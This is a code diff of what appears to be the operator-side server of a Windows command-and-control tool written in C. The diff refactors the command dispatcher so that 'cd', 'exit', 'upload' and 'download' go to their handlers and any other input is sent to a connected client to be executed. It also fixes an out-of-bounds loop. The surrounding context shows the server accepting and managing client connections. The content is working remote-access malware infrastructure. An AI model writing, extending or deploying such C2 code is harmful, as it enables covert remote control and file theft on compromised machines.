@@ -126,6 +126,7 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
 		}
 	}
+	return -1;
 }
 
 // Function to list all available connections.
@@ -239,21 +240,6 @@ int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_
 	return 0;
 }
 
-// Function to return function pointer based on parsed command.
-func parse_cmd(char* const buf) {
-	// Function pointer array of each c2 command.
-	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
-	// Array of command strings to parse stdin with.
-	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };
-
-	for (int i = 0; i < 5; i++) {
-		if (compare(buf, commands[i])) {
-			return func_array[i];
-		}
-	}
-
-	return NULL;
-}
 
 // Function to send command to client.
 int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
@@ -277,6 +263,21 @@ int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 	fputc('\n', stdout);
 
 	return iResult;
+}
+
+// Function to return function pointer based on parsed command.
+const func parse_cmd(char* const buf) {
+	// Array of command strings to parse stdin with.
+	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };
+	// Function pointer array of each c2 command.
+	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
+
+	for (int i = 0; i < 4; i++) {
+		if (compare(buf, commands[i])) {
+			return func_array[i];
+		}
+	}
+	return &send_cmd;
 }
 
 // Function to resize conns array/remove and close connection.
@@ -314,13 +315,8 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 			else {
 				// If a command is parsed call it's corresponding function else execute-
 				// the command on the client.
-				func target_func = parse_cmd(cmd);
-				if (target_func) {
-					iResult = target_func(buf, cmd_len, client_socket);
-				}
-				else {
-					iResult = send_cmd(buf, cmd_len, client_socket);
-				}
+				const func target_func = parse_cmd(cmd);
+				iResult = target_func(buf, cmd_len, client_socket);
 			}
 		}
 	}
